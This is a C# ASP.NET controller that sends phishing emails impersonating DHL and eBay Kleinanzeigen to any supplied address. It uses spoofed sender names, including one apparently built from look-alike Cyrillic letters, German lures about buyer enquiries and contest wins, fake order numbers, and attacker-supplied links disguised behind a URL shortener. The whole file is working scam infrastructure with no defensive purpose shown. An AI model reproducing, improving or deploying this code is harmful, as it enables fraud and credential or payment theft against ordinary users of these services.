using System.Net;
using System.Net.Mail;
using DteCrm.Services.EmailService;
using Microsoft.AspNetCore.Mvc;
using NoWayMailerAPI.Data;
using NoWayMailerAPI.Services.Interfaces;
using FileIO = System.IO.File;

namespace MailerRobot.Controllers;

[ApiController]
[Route("/api/[controller]")]
public class SenderController : ControllerBase
{
    private readonly IConfiguration _configuration;
    private readonly IShortLinkService _shortLinkService;
    private readonly SmtpClient _smtpClient;
    private readonly string _senderEmail;

    public SenderController(IConfiguration configuration, IShortLinkService shortLinkService)
    {
        _configuration = configuration;
        _shortLinkService = shortLinkService;
		
        var config = new EmailSendingConfiguration();
        _configuration.GetSection("MailSettings")
            .GetChildren()
            .First(e => e.Key == "Smtp3")
            .Bind(config);

        _smtpClient = new SmtpClient(config.Host, config.Port)
        {
            Credentials = new NetworkCredential(config.User, config.Password),
            EnableSsl = true
        };

        _senderEmail = config.User;
    }

    [HttpGet("dhl")]
    public async Task<IActionResult> SendDHLEmail(string email, string link)
    {
        var orderNumber = Random.Shared.Next(234422000, 234522847);

        var body = await GetBody(link, ServiceType.DHL);

        var message = new MailMessage(_senderEmail, email, $"Unser Team hat einen Kunden für Sie gefunden #{orderNumber}", body)
        {
            IsBodyHtml = true,
            From = new MailAddress(_senderEmail, "•DHL•Lieferungen")
        };

        try
        {
            await _smtpClient.SendMailAsync(message);

            return Ok();
        }
        catch (Exception e)
        {
            return BadRequest(e.Message);
        }
    }

    [HttpGet("ebay")]
    public async Task<IActionResult> SendEbayEmail(string email, string link)
    {
        var body = await GetBody(link, ServiceType.EbayDe);

        var message = new MailMessage(_senderEmail, email, "Nutzer-Anfrage zu deiner Anzeige!", body)
        {
            IsBodyHtml = true,
            From = new MailAddress(_senderEmail, "•EBAY•Kleinanzeigen")
        };

        try
        {
            await _smtpClient.SendMailAsync(message);

            return Ok();
        }
        catch (Exception e)
        {
            return BadRequest(e.Message);
        }
    }

    [HttpGet("ebay-congrats")]
    public async Task<IActionResult> SendEbayCongratsEmail(string email, string link)
    {
        var body = await GetBody(link, ServiceType.EbayCongrats);

        var message = new MailMessage(_senderEmail, email, "Herzlichen Glückwunsch zum Gewinn des Wettbewerbs!", body)
        {
            IsBodyHtml = true,
            From = new MailAddress(_senderEmail, "еВау Kleinanzeigen")
        };

        try
        {
            await _smtpClient.SendMailAsync(message);

            return Ok();
        }
        catch (Exception e)
        {
            return BadRequest(e.Message);
        }
    }

    private async Task<string> GetBody(string link, ServiceType serviceType)
    {
        var shortLink = await _shortLinkService.GetShortLink(link);

        string filePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Templates", $"{serviceType}.html");

		var hmtlBody = FileIO.ReadAllText(filePath)
							.Replace("PutYourLinkHere", shortLink);

		return hmtlBody
                .Replace("DateNow", DateTime.Now.ToString("dd-MM-yyyy"));
    }
}